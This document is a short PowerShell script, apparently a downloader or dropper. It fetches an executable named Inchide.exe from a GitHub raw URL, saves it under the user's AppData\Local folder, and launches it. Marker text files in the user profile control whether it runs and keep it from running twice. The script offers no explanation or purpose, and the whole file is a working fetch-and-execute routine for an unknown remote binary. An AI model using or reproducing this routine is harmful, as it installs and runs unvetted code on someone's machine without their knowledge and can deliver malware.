$x = "https://github.com/webntdev/webntdev.github.io/raw/main/Inchide/Inchide.exe"
$y = Join-Path -Path $env:USERPROFILE -ChildPath "AppData\Local\inchide.exe"

if (Test-Path "$env:USERPROFILE\EXITR2.txt") {
    exit
}

New-Item -Path "$env:USERPROFILE\H123R2.txt" -ItemType "file" -Force

Invoke-WebRequest -Uri $x -OutFile $y

if (Test-Path "$env:USERPROFILE\H360R2.txt") {
    New-Item -Path "$env:USERPROFILE\EXITR2.txt" -ItemType "file" -Force
    Start-Process $y
}

if (Test-Path "$env:USERPROFILE\H123R2.txt") {
    New-Item -Path "$env:USERPROFILE\H360R2.txt" -ItemType "file" -Force
    Start-Process $y
}
